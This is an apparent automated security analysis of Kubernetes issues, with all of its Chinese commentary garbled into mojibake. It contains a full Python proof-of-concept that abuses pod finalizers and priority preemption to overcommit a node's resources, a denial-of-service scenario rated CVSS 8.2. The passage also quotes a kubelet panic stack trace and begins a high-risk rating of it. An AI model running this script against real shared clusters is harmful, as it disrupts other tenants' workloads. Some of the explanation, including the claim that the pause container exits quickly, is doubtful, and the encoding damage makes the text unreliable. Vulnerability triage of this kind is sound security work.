4.  **åæœ**: è°ƒåº¦å™¨æ¥æ”¶åˆ°è¿™ä¸ªâ€œåˆæˆåˆ é™¤â€äº‹ä»¶åï¼Œé”™è¯¯åœ°è®¤ä¸ºä½ä¼˜å…ˆçº§Podå·²ç»é‡Šæ”¾äº†èµ„æºï¼Œäºæ˜¯ç«‹å³å°†é«˜ä¼˜å…ˆçº§çš„Podè°ƒåº¦åˆ°è¯¥èŠ‚ç‚¹ä¸Šã€‚ç„¶è€Œï¼Œç”±äºfinalizerçš„å­˜åœ¨ï¼Œä½ä¼˜å…ˆçº§çš„Podå®é™…ä¸Šä»ç„¶å­˜åœ¨äºèŠ‚ç‚¹ä¸Šï¼Œå¹¶å ç”¨ç€èµ„æºã€‚è¿™å¯¼è‡´äº†èŠ‚ç‚¹èµ„æºçš„â€œè¶…å”®â€ï¼ˆOvercommitmentï¼‰ã€‚é«˜ä¼˜å…ˆçº§çš„Podè¢«è°ƒåº¦åˆ°äº†ä¸€ä¸ªå®é™…ä¸Šæ²¡æœ‰è¶³å¤Ÿèµ„æºçš„èŠ‚ç‚¹ä¸Šï¼Œå¯èƒ½ä¼šå¯¼è‡´è¯¥Podå¯åŠ¨å¤±è´¥ï¼Œæˆ–è€…å¯¹èŠ‚ç‚¹ä¸Šå…¶ä»–æ­£åœ¨è¿è¡Œçš„Podäº§ç”Ÿè´Ÿé¢å½±å“ï¼Œé€ æˆèµ„æºäº‰æŠ¢ï¼Œæœ¬è´¨ä¸Šæ˜¯ä¸€ç§æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»ã€‚

æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸ªé€»è¾‘æ¼æ´ï¼Œé€šè¿‡ç²¾å¿ƒæ„é€ å¸¦æœ‰finalizerçš„ä½ä¼˜å…ˆçº§Podï¼Œæ¥â€œæ¬ºéª—â€è°ƒåº¦å™¨ï¼Œä½¿å…¶å°†é‡è¦çš„é«˜ä¼˜å…ˆçº§Podè°ƒåº¦åˆ°ä¸åˆé€‚çš„èŠ‚ç‚¹ä¸Šï¼Œä»è€Œå¯¼è‡´è¿™äº›é«˜ä¼˜å…ˆçº§åº”ç”¨æ— æ³•æ­£å¸¸è¿è¡Œã€‚è¿™ç§æ”»å‡»åœ¨å¤šç§Ÿæˆ·ç¯å¢ƒä¸­å°¤å…¶å±é™©ï¼Œä¸€ä¸ªä½æƒé™ç”¨æˆ·å¯ä»¥å½±å“åˆ°å…¶ä»–ç”¨æˆ·ï¼ˆç”šè‡³æ˜¯é«˜æƒé™ç”¨æˆ·ï¼‰çš„å…³é”®ä¸šåŠ¡ã€‚

æ ¹æ®CVSS 3.1æ ‡å‡†è¿›è¡Œè¯„ä¼°ï¼š
*   **Attack Vector (AV): Network (N)** - æ”»å‡»è€…é€šè¿‡K8s APIå‘èµ·æ”»å‡»ã€‚
*   **Attack Complexity (AC): Low (L)** - æ”»å‡»è€…åªéœ€åˆ›å»ºä¸¤ä¸ªç‰¹å®šé…ç½®çš„Podå³å¯ã€‚
*   **Privileges Required (PR): Low (L)** - åªéœ€è¦æ‹¥æœ‰åˆ›å»ºPodçš„æ™®é€šæƒé™ï¼Œè¿™åœ¨å¤šç§Ÿæˆ·é›†ç¾¤ä¸­æ˜¯å¸¸è§æƒé™ã€‚
*   **User Interaction (UI): None (N)** - æ— éœ€ç”¨æˆ·äº¤äº’ã€‚
*   **Scope (S): Changed (C)** - æ¼æ´åœ¨æ§åˆ¶å¹³é¢ï¼ˆè°ƒåº¦å™¨ï¼‰ä¸­ï¼Œä½†å…¶å½±å“ä½“ç°åœ¨æ•°æ®å¹³é¢ï¼ˆå·¥ä½œèŠ‚ç‚¹ï¼‰ï¼Œä¸€ä¸ªç”¨æˆ·çš„Podå¯ä»¥å½±å“å…¶ä»–ç”¨æˆ·çš„Podã€‚
*   **Confidentiality (C): None (N)** - ä¸æ¶‰åŠä¿¡æ¯æ³„éœ²ã€‚
*   **Integrity (I): Low (L)** - å¯èƒ½å¯¼è‡´é«˜ä¼˜å…ˆçº§Podæ— æ³•æ­£å¸¸å¯åŠ¨ï¼Œä½†ä¸ä¼šç›´æ¥ç ´åå…¶æ•°æ®ã€‚
*   **Availability (A): High (H)** - å¯ä»¥å¯¼è‡´èŠ‚ç‚¹èµ„æºè¶…å”®ï¼Œä½¿é«˜ä¼˜å…ˆçº§åº”ç”¨æ— æ³•è°ƒåº¦æˆ–è¿è¡Œå¤±è´¥ï¼Œå¯èƒ½é€ æˆå¤§èŒƒå›´çš„æ‹’ç»æœåŠ¡ã€‚

ç»¼åˆè¯„åˆ†ä¸º **8.2 (High)**ã€‚è¯¥é—®é¢˜å±äºé«˜é£é™©å®‰å…¨æ¼æ´ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import time
import uuid
import sys
from kubernetes import client, config
from kubernetes.client.rest import ApiException

# ä¸ºæœ¬æ¬¡æµ‹è¯•ç”Ÿæˆä¸€ä¸ªå”¯ä¸€çš„åç¼€
UNIQUE_ID = str(uuid.uuid4())[:8]
LOW_PRIORITY_CLASS_NAME = f"low-priority-{UNIQUE_ID}"
HIGH_PRIORITY_CLASS_NAME = f"high-priority-{UNIQUE_ID}"
LOW_PRIORITY_POD_NAME = f"pod-low-priority-{UNIQUE_ID}"
HIGH_PRIORITY_POD_NAME = f"pod-high-priority-{UNIQUE_ID}"
NAMESPACE = "default"
CUSTOM_RESOURCE_NAME = "example.com/foo"
CUSTOM_RESOURCE_NAME_FOR_PATCH = "example.com~1foo" # k8s JSON patch requires ~1 for /

def main():
    """
    ä¸»æ‰§è¡Œå‡½æ•°
    """
    try:
        # 1. åˆå§‹åŒ–Kuberneteså®¢æˆ·ç«¯
        print("1. Initializing Kubernetes client...")
        config.load_kube_config()
        core_v1 = client.CoreV1Api()
        scheduling_v1 = client.SchedulingV1Api()
        print("   Client initialized.")

        # 2. é€‰æ‹©ä¸€ä¸ªå·¥ä½œèŠ‚ç‚¹å¹¶æ·»åŠ è‡ªå®šä¹‰èµ„æº
        print("\n2. Selecting a worker node and adding custom resource...")
        node_name = select_worker_node(core_v1)
        if not node_name:
            print("   ERROR: No worker nodes found. Aborting.", file=sys.stderr)
            return

        add_custom_resource_to_node(core_v1, node_name)
        print(f"   Node '{node_name}' patched with custom resource '{CUSTOM_RESOURCE_NAME}'.")

        # 3. åˆ›å»ºPriorityClasses
        print("\n3. Creating PriorityClasses...")
        create_priority_classes(scheduling_v1)
        print(f"   Created '{LOW_PRIORITY_CLASS_NAME}' and '{HIGH_PRIORITY_CLASS_NAME}'.")

        # 4. åˆ›å»ºå¹¶è°ƒåº¦å¸¦finalizerçš„ä½ä¼˜å…ˆçº§Pod
        print("\n4. Creating and scheduling the low-priority pod with a finalizer...")
        create_pod(core_v1, LOW_PRIORITY_POD_NAME, LOW_PRIORITY_CLASS_NAME, True)
        wait_for_pod_running(core_v1, LOW_PRIORITY_POD_NAME, NAMESPACE)
        print(f"   Pod '{LOW_PRIORITY_POD_NAME}' is running and consuming the custom resource.")

        # 5. åˆ›å»ºé«˜ä¼˜å…ˆçº§Podï¼Œè§¦å‘æŠ¢å 
        print("\n5. Creating the high-priority pod to trigger preemption...")
        create_pod(core_v1, HIGH_PRIORITY_POD_NAME, HIGH_PRIORITY_CLASS_NAME, False)
        print(f"   Pod '{HIGH_PRIORITY_POD_NAME}' created.")

        # 6. éªŒè¯æ¼æ´
        print("\n6. Verifying the vulnerability...")
        print("   Waiting to see if the high-priority pod gets scheduled while the low-priority pod is still terminating...")
        vulnerability_confirmed = verify_vulnerability(core_v1, node_name)

        if vulnerability_confirmed:
            print("\n[SUCCESS] Vulnerability confirmed!")
            print(f"High-priority pod '{HIGH_PRIORITY_POD_NAME}' was scheduled on node '{node_name}' while the low-priority pod '{LOW_PRIORITY_POD_NAME}' was still present with its finalizer.")
        else:
            print("\n[FAILURE] Could not confirm the vulnerability within the timeout.")
            print("The high-priority pod did not get scheduled as expected for the exploit.")

    except ApiException as e:
        print(f"\nAn API error occurred: {e.reason} ({e.status})", file=sys.stderr)
        print(f"Body: {e.body}", file=sys.stderr)
    except Exception as e:
        print(f"\nAn unexpected error occurred: {e}", file=sys.stderr)
    finally:
        # 7. æ¸…ç†èµ„æº
        print("\n7. Cleaning up all created resources...")
        cleanup(core_v1, scheduling_v1, node_name)
        print("   Cleanup complete.")

def select_worker_node(api_instance):
    """é€‰æ‹©ä¸€ä¸ªå¯ç”¨çš„å·¥ä½œèŠ‚ç‚¹"""
    nodes = api_instance.list_node()
    for node in nodes.items:
        # æ’é™¤masterèŠ‚ç‚¹
        if "node-role.kubernetes.io/master" not in node.metadata.labels and \
           "node-role.kubernetes.io/control-plane" not in node.metadata.labels:
            return node.metadata.name
    return None

def add_custom_resource_to_node(api_instance, node_name):
    """ä¸ºèŠ‚ç‚¹æ·»åŠ è‡ªå®šä¹‰èµ„æºå®¹é‡"""
    patch_body = [
        {
            "op": "add",
            "path": f"/status/capacity/{CUSTOM_RESOURCE_NAME_FOR_PATCH}",
            "value": "10",
        }
    ]
    api_instance.patch_node_status(node_name, patch_body)

def create_priority_classes(api_instance):
    """åˆ›å»ºä½ä¼˜å…ˆçº§å’Œé«˜ä¼˜å…ˆçº§çš„PriorityClass"""
    low_priority_pc = client.V1beta1PriorityClass(
        metadata=client.V1ObjectMeta(name=LOW_PRIORITY_CLASS_NAME),
        value=1,
        global_default=False,
        description="Low priority class for testing"
    )
    high_priority_pc = client.V1beta1PriorityClass(
        metadata=client.V1ObjectMeta(name=HIGH_PRIORITY_CLASS_NAME),
        value=1000,
        global_default=False,
        description="High priority class for testing"
    )
    try:
        api_instance.create_priority_class(body=low_priority_pc)
    except ApiException as e:
        if e.status != 409: raise # Ignore if already exists
    try:
        api_instance.create_priority_class(body=high_priority_pc)
    except ApiException as e:
        if e.status != 409: raise # Ignore if already exists

def create_pod(api_instance, pod_name, priority_class_name, with_finalizer):
    """åˆ›å»ºä¸€ä¸ªPod"""
    pod_manifest = {
        "apiVersion": "v1",
        "kind": "Pod",
        "metadata": {
            "name": pod_name,
        },
        "spec": {
            "priorityClassName": priority_class_name,
            "containers": [
                {
                    "name": "pause",
                    "image": "registry.k8s.io/pause:3.9",
                    "resources": {
                        "requests": {CUSTOM_RESOURCE_NAME: "10"},
                        "limits": {CUSTOM_RESOURCE_NAME: "10"},
                    },
                }
            ],
        },
    }
    if with_finalizer:
        pod_manifest["metadata"]["finalizers"] = ["example.com/do-not-delete"]
    
    api_instance.create_namespaced_pod(body=pod_manifest, namespace=NAMESPACE)

def wait_for_pod_running(api_instance, pod_name, namespace, timeout=60):
    """ç­‰å¾…Podè¿›å…¥RunningçŠ¶æ€"""
    start_time = time.time()
    while time.time() - start_time < timeout:
        try:
            pod = api_instance.read_namespaced_pod_status(pod_name, namespace)
            if pod.status.phase == 'Running':
                return True
        except ApiException as e:
            if e.status == 404:
                pass # Podå¯èƒ½è¿˜æœªåˆ›å»ºæˆåŠŸ
            else:
                raise
        time.sleep(2)
    raise TimeoutError(f"Pod {pod_name} did not become Running within {timeout} seconds.")

def verify_vulnerability(api_instance, expected_node_name, timeout=120):
    """éªŒè¯é«˜ä¼˜å…ˆçº§Podæ˜¯å¦è¢«é”™è¯¯åœ°è°ƒåº¦"""
    start_time = time.time()
    while time.time() - start_time < timeout:
        try:
            low_pod = api_instance.read_namespaced_pod(LOW_PRIORITY_POD_NAME, NAMESPACE)
            high_pod = api_instance.read_namespaced_pod_status(HIGH_PRIORITY_POD_NAME, NAMESPACE)

            # æ£€æŸ¥ä½ä¼˜å…ˆçº§Podæ˜¯å¦å¤„äºTerminatingçŠ¶æ€ä¸”finalizerä»ç„¶å­˜åœ¨
            low_pod_terminating = low_pod.metadata.deletion_timestamp is not None and \
                                  low_pod.metadata.finalizers is not None
            
            # æ£€æŸ¥é«˜ä¼˜å…ˆçº§Podæ˜¯å¦å·²ç»è¢«è°ƒåº¦åˆ°ç›®æ ‡èŠ‚ç‚¹
            high_pod_scheduled = high_pod.spec.node_name == expected_node_name

            if low_pod_terminating and high_pod_scheduled:
                return True
            
            # å¦‚æœä½ä¼˜å…ˆçº§Podçš„å®¹å™¨æ‰§è¡ŒæˆåŠŸï¼Œä¼šå¯¼è‡´å…¶çŠ¶æ€å˜ä¸ºSucceededï¼Œè¿™æ˜¯è§¦å‘bugçš„å…³é”®
            if low_pod.status.phase == 'Succeeded':
                print("   Low-priority pod has Succeeded, preemption should be in progress...")

        except ApiException as e:
            # å¿½ç•¥404é”™è¯¯ï¼Œå› ä¸ºPodå¯èƒ½æš‚æ—¶ä¸å¯è§
            if e.status != 404:
                print(f"   API Error during verification: {e.reason}", file=sys.stderr)
        
        time.sleep(3)
    return False

def cleanup(core_v1, scheduling_v1, node_name):
    """æ¸…ç†æ‰€æœ‰åˆ›å»ºçš„èµ„æº"""
    # 1. ç§»é™¤ä½ä¼˜å…ˆçº§Podçš„finalizerä»¥å…è®¸å…¶è¢«åˆ é™¤
    try:
        print(f"   Removing finalizer from {LOW_PRIORITY_POD_NAME}...")
        core_v1.patch_namespaced_pod(
            name=LOW_PRIORITY_POD_NAME,
            namespace=NAMESPACE,
            body={"metadata": {"finalizers": None}}
        )
    except ApiException as e:
        if e.status != 404:
            print(f"   Could not patch pod {LOW_PRIORITY_POD_NAME}: {e.reason}", file=sys.stderr)

    # 2. åˆ é™¤Pods
    for pod_name in [LOW_PRIORITY_POD_NAME, HIGH_PRIORITY_POD_NAME]:
        try:
            print(f"   Deleting pod {pod_name}...")
            core_v1.delete_namespaced_pod(pod_name, NAMESPACE)
        except ApiException as e:
            if e.status != 404:
                print(f"   Could not delete pod {pod_name}: {e.reason}", file=sys.stderr)

    # 3. åˆ é™¤PriorityClasses
    for pc_name in [LOW_PRIORITY_CLASS_NAME, HIGH_PRIORITY_CLASS_NAME]:
        try:
            print(f"   Deleting PriorityClass {pc_name}...")
            scheduling_v1.delete_priority_class(pc_name)
        except ApiException as e:
            if e.status != 404:
                print(f"   Could not delete PriorityClass {pc_name}: {e.reason}", file=sys.stderr)

    # 4. ç§»é™¤èŠ‚ç‚¹ä¸Šçš„è‡ªå®šä¹‰èµ„æº
    if node_name:
        try:
            print(f"   Removing custom resource from node {node_name}...")
            patch_body = [
                {"op": "remove", "path": f"/status/capacity/{CUSTOM_RESOURCE_NAME_FOR_PATCH}"}
            ]
            core_v1.patch_node_status(node_name, patch_body)
        except ApiException as e:
            # å¯èƒ½ä¼šå› ä¸ºèµ„æºä¸å­˜åœ¨è€Œå¤±è´¥ï¼Œå¯ä»¥å¿½ç•¥
            if "not found" not in str(e.body).lower():
                 print(f"   Could not remove custom resource from node {node_name}: {e.reason}", file=sys.stderr)


# ç›´æ¥æ‰§è¡Œmainå‡½æ•°
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥Pythonè„šæœ¬æ—¨åœ¨ä½¿ç”¨`kubernetes`å®˜æ–¹Pythonå®¢æˆ·ç«¯åº“åœ¨æœ¬åœ°æˆ–è¿œç¨‹Kubernetesé›†ç¾¤ä¸­å¤ç°ä¸Šè¿°å®‰å…¨é—®é¢˜ã€‚è„šæœ¬æ‰§è¡Œè¿‡ç¨‹ä¸¥æ ¼éµå¾ªäº†Issueä¸­æè¿°çš„å¤ç°æ­¥éª¤ã€‚

**è„šæœ¬æ‰§è¡Œæµç¨‹ï¼š**

1.  **åˆå§‹åŒ–ä¸ç¯å¢ƒå‡†å¤‡**:
    *   è„šæœ¬é¦–å…ˆåŠ è½½æœ¬åœ°çš„`kubeconfig`æ–‡ä»¶æ¥è¿æ¥åˆ°Kubernetesé›†ç¾¤ã€‚
    *   ä¸ºäº†æ¨¡æ‹Ÿèµ„æºç«äº‰ï¼Œè„šæœ¬ä¼šé€‰æ‹©ä¸€ä¸ªå·¥ä½œèŠ‚ç‚¹ï¼ˆWorker Nodeï¼‰ï¼Œå¹¶é€šè¿‡PATCHæ“ä½œä¸ºå…¶æ·»åŠ ä¸€ä¸ªä¸´æ—¶çš„è‡ªå®šä¹‰èµ„æº `example.com/foo`ï¼Œå®¹é‡è®¾ç½®ä¸º10ã€‚è¿™ä¸ªèµ„æºæ˜¯åç»­Podè°ƒåº¦çš„å…³é”®ã€‚
    *   åˆ›å»ºä¸¤ä¸ª`PriorityClass`ï¼šä¸€ä¸ªä½ä¼˜å…ˆçº§ï¼ˆ`low-priority`ï¼‰ï¼Œä¸€ä¸ªé«˜ä¼˜å…ˆçº§ï¼ˆ`high-priority`ï¼‰ï¼Œç”¨äºåŒºåˆ†åç»­åˆ›å»ºçš„Podã€‚

2.  **åˆ›å»ºä½ä¼˜å…ˆçº§Pod**:
    *   è„šæœ¬åˆ›å»ºä¸€ä¸ªåä¸º`pod-low-priority-...`çš„Podã€‚
    *   æ­¤Podè¢«è®¾ç½®ä¸ºä½ä¼˜å…ˆçº§ï¼Œå¹¶ä¸”è¯·æ±‚å…¨éƒ¨çš„è‡ªå®šä¹‰èµ„æºï¼ˆ10ä¸ªå•ä½çš„`example.com/foo`ï¼‰ã€‚
    *   æœ€å…³é”®çš„æ˜¯ï¼Œæ­¤Podçš„å…ƒæ•°æ®ä¸­åŒ…å«ä¸€ä¸ª`finalizer` (`example.com/do-not-delete`)ã€‚è¿™ä¸ª`finalizer`ä¼šé˜»æ­¢Podåœ¨è¢«åˆ é™¤æ—¶ç«‹å³æ¶ˆå¤±ï¼Œä¼šä½¿å…¶åœç•™åœ¨`Terminating`çŠ¶æ€ã€‚
    *   è„šæœ¬ä¼šç­‰å¾…è¿™ä¸ªPodæˆåŠŸè°ƒåº¦å¹¶è¿›å…¥`Running`çŠ¶æ€ï¼Œç¡®ä¿å®ƒå·²å ç”¨äº†èŠ‚ç‚¹ä¸Šçš„è‡ªå®šä¹‰èµ„æºã€‚

3.  **è§¦å‘æŠ¢å **:
    *   è„šæœ¬æ¥ç€åˆ›å»ºå¦ä¸€ä¸ªåä¸º`pod-high-priority-...`çš„Podã€‚
    *   æ­¤Podè¢«è®¾ç½®ä¸ºé«˜ä¼˜å…ˆçº§ï¼Œå¹¶ä¸”è¯·æ±‚ä¸ä½ä¼˜å…ˆçº§Podç›¸åŒçš„è‡ªå®šä¹‰èµ„æºã€‚
    *   ç”±äºèŠ‚ç‚¹ä¸Šçš„è‡ªå®šä¹‰èµ„æºå·²ç»è¢«ä½ä¼˜å…ˆçº§Podå ç”¨ï¼Œé«˜ä¼˜å…ˆçº§Podçš„åˆ›å»ºä¼šè§¦å‘è°ƒåº¦å™¨çš„æŠ¢å é€»è¾‘ï¼Œè°ƒåº¦å™¨å°†å°è¯•é©±é€ä½ä¼˜å…ˆçº§Podã€‚

4.  **æ¼æ´éªŒè¯**:
    *   è¿™æ˜¯è„šæœ¬çš„æ ¸å¿ƒéªŒè¯éƒ¨åˆ†ã€‚è„šæœ¬ä¼šè¿›å…¥ä¸€ä¸ªå¾ªç¯ï¼Œåœ¨120ç§’è¶…æ—¶æ—¶é—´å†…æŒç»­ç›‘æ§ä¸¤ä¸ªPodçš„çŠ¶æ€ã€‚
    *   **ä½ä¼˜å…ˆçº§Pod**: å› ä¸ºPodä¸­è¿è¡Œçš„`pause`å®¹å™¨ä¼šå¾ˆå¿«é€€å‡ºï¼ŒPodçŠ¶æ€ä¼šå˜ä¸º`Succeeded`ã€‚æ­¤æ—¶æŠ¢å é€»è¾‘ä¼šå°†å…¶æ ‡è®°ä¸ºåˆ é™¤ï¼ŒPodè¿›å…¥`Terminating`çŠ¶æ€ï¼Œä½†`finalizer`ä¼šé˜»æ­¢å…¶è¢«ç‰©ç†åˆ é™¤ã€‚
    *   **è°ƒåº¦å™¨è¡Œä¸º**: å½“ä½ä¼˜å…ˆçº§PodçŠ¶æ€å˜ä¸º`Succeeded`åï¼Œå®ƒä¸å†åŒ¹é…è°ƒåº¦å™¨`status.phase!=Succeeded`çš„ç›‘æ§æ¡ä»¶ï¼Œè°ƒåº¦å™¨ä¼šæ”¶åˆ°ä¸€ä¸ªâ€œåˆæˆåˆ é™¤â€äº‹ä»¶ï¼Œå¹¶é”™è¯¯åœ°è®¤ä¸ºèµ„æºå·²é‡Šæ”¾ã€‚
    *   **é«˜ä¼˜å…ˆçº§Pod**: è„šæœ¬ä¼šæ£€æŸ¥é«˜ä¼˜å…ˆçº§Podæ˜¯å¦è¢«è°ƒåº¦åˆ°äº†ç›®æ ‡èŠ‚ç‚¹ä¸Šï¼ˆå³`spec.nodeName`å­—æ®µè¢«è®¾ç½®ï¼‰ã€‚
    *   **æˆåŠŸæ¡ä»¶**: å¦‚æœè„šæœ¬æ£€æµ‹åˆ°é«˜ä¼˜å…ˆçº§Podå·²ç»è¢«è°ƒåº¦ï¼ˆ`high_pod_scheduled`ä¸º`True`ï¼‰ï¼Œè€ŒåŒæ—¶ä½ä¼˜å…ˆçº§Podä»å¤„äº`Terminating`çŠ¶æ€ä¸”`finalizer`ä»ç„¶å­˜åœ¨ï¼ˆ`low_pod_terminating`ä¸º`True`ï¼‰ï¼Œåˆ™è¯æ˜æ¼æ´å¤ç°æˆåŠŸã€‚è¿™è¡¨æ˜è°ƒåº¦å™¨åœ¨èµ„æºæœªå®é™…é‡Šæ”¾æ—¶å°±åˆ†é…äº†èµ„æºã€‚

5.  **æ¸…ç†**:
    *   æ— è®ºå¤ç°æˆåŠŸä¸å¦ï¼Œ`finally`å—ä¸­çš„æ¸…ç†é€»è¾‘éƒ½ä¼šæ‰§è¡Œï¼Œä»¥ç¡®ä¿ä¸ç•™ä¸‹ä»»ä½•æµ‹è¯•åƒåœ¾ã€‚
    *   æ¸…ç†æ­¥éª¤åŒ…æ‹¬ï¼šç§»é™¤ä½ä¼˜å…ˆçº§Podçš„`finalizer`ï¼ˆè¿™æ˜¯åˆ é™¤å®ƒçš„å‰æï¼‰ã€åˆ é™¤ä¸¤ä¸ªPodã€åˆ é™¤ä¸¤ä¸ª`PriorityClass`ï¼Œä»¥åŠç§»é™¤èŠ‚ç‚¹ä¸Šæ·»åŠ çš„è‡ªå®šä¹‰èµ„æºã€‚è¿™ä¿è¯äº†é›†ç¾¤ç¯å¢ƒèƒ½å¤Ÿæ¢å¤åˆ°è„šæœ¬æ‰§è¡Œå‰çš„çŠ¶æ€ã€‚

é€šè¿‡ä»¥ä¸Šæ­¥éª¤ï¼Œè¯¥è„šæœ¬èƒ½å¤Ÿåœ¨çœŸå®ç¯å¢ƒä¸­ç²¾ç¡®åœ°æ¨¡æ‹Ÿå‡ºå› è°ƒåº¦å™¨é€»è¾‘ç¼ºé™·å¯¼è‡´çš„èµ„æºè¶…å”®é—®é¢˜ï¼Œä»è€ŒéªŒè¯è¯¥é«˜é£é™©æ¼æ´çš„å­˜åœ¨ã€‚

---


## Issue #131688 Kubelet service panic

- Issue é“¾æ¥ï¼š[#131688](https://github.com/kubernetes/kubernetes/issues/131688)

### Issue å†…å®¹

#### What happened?

Kubelet service exited due to panic.

Log is here:

[0506.txt](https://github.com/user-attachments/files/20116037/0506.txt)

kubelet[6048]: panic: assignment to entry in nil map
kubelet[6048]: goroutine 443 [running]:
kubelet[6048]: k8s.io/apimachinery/pkg/util/sets.Set[...].Insert(0xc007a80210?, {0xc003c5eef0?, 0x1?, 0xc00577f320})
kubelet[6048]:         vendor/k8s.io/apimachinery/pkg/util/sets/set.go:50 +0x6a
kubelet[6048]: k8s.io/apimachinery/pkg/util/sets.String.Insert(...)
kubelet[6048]:         vendor/k8s.io/apimachinery/pkg/util/sets/string.go:40
kubelet[6048]: k8s.io/kubernetes/pkg/kubelet/cm/devicemanager.(*ManagerImpl).devicesToAllocate.func1(0x52d3ca0?)
kubelet[6048]:         pkg/kubelet/cm/devicemanager/manager.go:579 +0x165
kubelet[6048]: k8s.io/kubernetes/pkg/kubelet/cm/devicemanager.(*ManagerImpl).devicesToAllocate(0xc001805200, {0xc0020105a0, 0x24}, {0xc002010930, 0x26}, {0xc004343050, 0xe}, 0x1, 0xc00873b040?)
kubelet[6048]:         pkg/kubelet/cm/devicemanager/manager.go:618 +0xafd
kubelet[6048]: k8s.io/kubernetes/pkg/kubelet/cm/devicemanager.(*ManagerImpl).allocateContainerResources(0xc001805200, 0xc0011a7230?, 0xc0020105a0?, 0x24?)
kubelet[6048]:         pkg/kubelet/cm/devicemanager/manager.go:783 +0x345
kubelet[6048]: k8s.io/kubernetes/pkg/kubelet/cm/devicemanager.(*ManagerImpl).Allocate(0xc001805200, 0xc0093a0480, 0xc003870b00)
kubelet[6048]:         pkg/kubelet/cm/devicemanager/manager.go:330 +0x1f0
kubelet[6048]: k8s.io/kubernetes/pkg/kubelet/cm/topologymanager.(*scope).allocateAlignedResources(0xc000dbcc30?, 0xc0020105a0?, 0x24?)
kubelet[6048]:         pkg/kubelet/cm/topologymanager/scope.go:150 +0x79
kubelet[6048]: k8s.io/kubernetes/pkg/kubelet/cm/topologymanager.(*containerScope).Admit(0xc000dbcc30, 0xc0093a0480)
kubelet[6048]:         pkg/kubelet/cm/topologymanager/scope_container.go:62 +0x7d8
kubelet[6048]: k8s.io/kubernetes/pkg/kubelet/cm/topologymanager.(*manager).Admit(0xc00068e7a0, 0xc004cd0800)
kubelet[6048]:         pkg/kubelet/cm/topologymanager/topology_manager.go:213 +0xaa
kubelet[6048]: k8s.io/kubernetes/pkg/kubelet.(*Kubelet).canAdmitPod(0xc0002b5800, {0xc0038709a0, 0x17, 0x2a}, 0xc0093a0480)
kubelet[6048]:         pkg/kubelet/kubelet.go:2085 +0x143
kubelet[6048]: k8s.io/kubernetes/pkg/kubelet.(*Kubelet).HandlePodAdditions(0xc0002b5800, {0xc002356050?, 0x1, 0x1})
kubelet[6048]:         pkg/kubelet/kubelet.go:2363 +0x1e5
kubelet[6048]: k8s.io/kubernetes/pkg/kubelet.(*Kubelet).syncLoopIteration(0xc0002b5800, {0x52ccaa8, 0xc00031e010}, 0xc00238cfc0, {0x52d6240, 0xc0002b5800?}, 0xc0030a4480, 0xc0030a44e0, 0xc00258b2c0)
kubelet[6048]:         pkg/kubelet/kubelet.go:2204 +0xb73
kubelet[6048]: k8s.io/kubernetes/pkg/kubelet.(*Kubelet).syncLoop(0xc0002b5800, {0x52ccaa8, 0xc00031e010}, 0xc0011607d0?, {0x52d6240, 0xc0002b5800})
kubelet[6048]:         pkg/kubelet/kubelet.go:2147 +0x312
kubelet[6048]: k8s.io/kubernetes/pkg/kubelet.(*Kubelet).Run(0xc0002b5800, 0x0?)
kubelet[6048]:         pkg/kubelet/kubelet.go:1558 +0x729
kubelet[6048]: created by k8s.io/kubernetes/cmd/kubelet/app.startKubelet
kubelet[6048]:         cmd/kubelet/app/server.go:1193 +0xb8
systemd[1]: kubelet.service: Main process exited, code=exited, status=2/INVALIDARGUMENT

#### What did you expect to happen?

Kubelet service works without crash

#### How can we reproduce it (as minimally and precisely as possible)?

Delete the pod, then start two or more pods at the same time.

#### Anything else we need to know?

N/A

#### Kubernetes version

<details>

```console
$ kubelet --version
Kubernetes v1.26.5-1+2956a182f24725
```

</details>


#### Cloud provider

external


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release 
NAME="Ubuntu"
VERSION="20.04.6 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.6 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal
```

</details>


#### Install tools

N/A

#### Container runtime (CRI) and version (if applicable)

containerd

Server:
  Version:  v1.7.2-3-g9c23b40d0.m
  Revision: 9c23b40d0a88bfaa64cd42d16383fb830909d68f.m
  UUID: c0b2c68c-93dd-44b4-b57c-610b97702059

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

N/A

### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
é«˜é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ Issue æè¿°äº†ä¸€ä¸ª Kubelet æœåŠ¡å›  panic è€Œé€€å‡ºçš„é—®é¢˜ã€‚æ ¹æ®æä¾›çš„æ—¥å¿—å †æ ˆä¿¡æ¯ï¼Œpanic å‘ç”Ÿåœ¨ `k8s.io/kubernetes/pkg/kubelet/cm/devicemanager.(*ManagerImpl).devicesToAllocate` å‡½æ•°ä¸­ï¼Œæ ¹æœ¬åŸå› æ˜¯ `assignment to entry in nil map`ï¼Œå³å‘ä¸€ä¸ªæœªåˆå§‹åŒ–çš„ map å†™å…¥æ•°æ®ã€‚

è°ƒç”¨é“¾æ˜¾ç¤ºï¼Œè¿™ä¸ªè¿‡ç¨‹å§‹äº `HandlePodAdditions`ï¼Œç»è¿‡ `canAdmitPod`ã€`topologymanager` å’Œ `devicemanager`ï¼Œæœ€ç»ˆåœ¨ä¸ºå®¹å™¨åˆ†é…è®¾å¤‡èµ„æºæ—¶è§¦å‘äº† panicã€‚è¿™è¡¨æ˜å½“ Kubelet å°è¯•ä¸ºæ–°åˆ›å»ºçš„ Pod åˆ†é…è®¾å¤‡ï¼ˆå¦‚ GPUã€FPGA ç­‰ç”± device plugin ç®¡ç†çš„è®¾å¤‡ï¼‰æ—¶ï¼Œå†…éƒ¨çš„æŸä¸ª map ç±»å‹çš„å˜é‡æ²¡æœ‰è¢«æ­£ç¡®åˆå§‹åŒ–ã€‚

